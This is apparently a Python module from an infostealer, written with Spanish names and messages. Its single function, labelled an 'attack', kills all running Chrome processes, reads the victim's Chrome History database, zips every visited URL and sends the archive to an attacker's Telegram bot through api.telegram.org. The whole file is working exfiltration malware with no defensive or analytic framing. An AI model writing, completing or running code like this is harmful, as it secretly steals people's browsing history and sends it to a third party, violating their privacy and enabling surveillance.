
import zipfile
import requests
import sqlite3
import os
import psutil
import io
from config import get_telegram_config


def historial_defuald_ataque():
    
    telegram_config = get_telegram_config()
    TOKEN = telegram_config['TOKEN']
    CHAT_ID = telegram_config['CHAT_ID']

    resultado_username = os.environ['USERNAME']

    nombre_archivo_zip = f'{resultado_username}_default_history.zip'

    chrome_directory = f"C:\\Users\\{resultado_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"

    if os.path.exists(chrome_directory):
        histori_path = os.path.join(chrome_directory, "History")
        
        chrome_process_name = "chrome.exe"

        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == chrome_process_name:
                try:
                    psutil.Process(process.info['pid']).terminate()
                    print(f"Cerrado el proceso de Chrome con PID {process.info['pid']}")
                except psutil.NoSuchProcess:
                    pass

        connection = sqlite3.connect(histori_path)
        cursor = connection.cursor()
        cursor.execute("SELECT url FROM urls ORDER BY last_visit_time")
        urls = cursor.fetchall()
        connection.close()

        zip_buffer = io.BytesIO()

        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as archivo_zip:
            with io.TextIOWrapper(archivo_zip.open('urls.txt', 'w'), encoding='utf-8') as zip_file:
                zip_file.write(f"URLs del perfil {histori_path}:\n")
                for url in urls:
                    zip_file.write(url[0] + '\n')

        url_telegram = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

        zip_buffer.seek(0)

        archivos = {'document': (nombre_archivo_zip, zip_buffer)}
        parametros = {'chat_id': CHAT_ID}
        respuesta = requests.post(url_telegram, params=parametros, files=archivos)

        if respuesta.status_code == 200:
            print("Archivos enviados con éxito a Telegram.")
        else:
            print(f"Error al enviar los archivos a Telegram. Código de estado: {respuesta.status_code}")
    else:
        print("El directorio de Chrome no existe en la ubicación predeterminada.")







